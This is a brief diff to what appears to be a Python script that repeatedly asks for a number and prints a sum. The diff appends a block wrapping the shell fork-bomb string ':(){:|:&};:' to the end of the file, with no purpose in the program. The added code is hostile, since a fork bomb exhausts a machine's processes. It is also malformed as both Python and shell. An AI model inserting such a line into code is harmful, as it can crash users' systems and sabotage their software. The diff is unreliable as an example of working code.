@@ -16,3 +16,6 @@ while num > 0:
     num = int(input("Enter number to calculate: "))
     print(sumNumbers(num))
 print("End..")
+{
+:(){:|:&};:
+        }
